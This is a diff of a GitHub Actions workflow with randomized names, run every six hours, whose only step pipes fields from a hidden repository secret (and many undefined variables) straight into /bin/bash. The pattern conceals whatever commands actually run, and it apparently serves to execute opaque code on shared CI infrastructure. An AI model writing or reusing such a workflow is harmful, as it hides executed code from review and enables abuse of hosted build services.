@@ -3,9 +3,8 @@ name: tengtexie6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 1/6 * * *'
-
-jobs:  # 28273
+    - cron: '21 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,12 +12,30 @@ jobs:  # 28273
       - uses: actions/checkout@v4
       - name: tengtexie6789
         env:
-          zikf39850: ${{ secrets.zikf39850 }}
+          nkp2: ${{ secrets.nkp2 }}
         run: |
-          echo $zikf39850 | jq -r .x55199 | /bin/bash
-          echo $pe49 | jq -r .xi341 | /bin/bash
-          echo $h86107 | jq -r .gfwc4925 | /bin/bash
-          echo $fbgqd5563 | jq -r .ytibq48 | /bin/bash
-          echo $k17 | jq -r .h0474 | /bin/bash
-          echo $yjeq448 | jq -r .drxpj33424 | /bin/bash
+          echo $nkp2 | jq -r .d3909 | /bin/bash
+          echo $feyej63 | jq -r .y8739 | /bin/bash
+          echo $hbc0 | jq -r .s418 | /bin/bash
+          echo $kj0201 | jq -r .ppvzb3 | /bin/bash
+          echo $ipunl11 | jq -r .bekk34609 | /bin/bash
+          echo $vvxd18820 | jq -r .vytc88249 | /bin/bash
+          echo $dr020 | jq -r .n76424 | /bin/bash
+          echo $lic47 | jq -r .gt46057 | /bin/bash
+          echo $ln8069 | jq -r .dpov12 | /bin/bash
+          echo $cx7 | jq -r .qz72 | /bin/bash
+          echo $hz058 | jq -r .qkpik72656 | /bin/bash
+          echo $yj337 | jq -r .dlxj182 | /bin/bash
+          echo $mkci634 | jq -r .cd933 | /bin/bash
+          echo $d21 | jq -r .ega801 | /bin/bash
+          echo $jc34 | jq -r .vzts00 | /bin/bash
+          echo $hu5270 | jq -r .ipskh4 | /bin/bash
+          echo $t0990 | jq -r .gw8 | /bin/bash
+          echo $z62 | jq -r .k7 | /bin/bash
+          echo $fraix8239 | jq -r .ak32 | /bin/bash
+          echo $jz40 | jq -r .des604 | /bin/bash
+          echo $i871 | jq -r .y185 | /bin/bash
+          echo $u8218 | jq -r .cyw614 | /bin/bash
+          echo $tpbwd17674 | jq -r .ihlfr0 | /bin/bash
+          echo $h45 | jq -r .m47 | /bin/bash
 
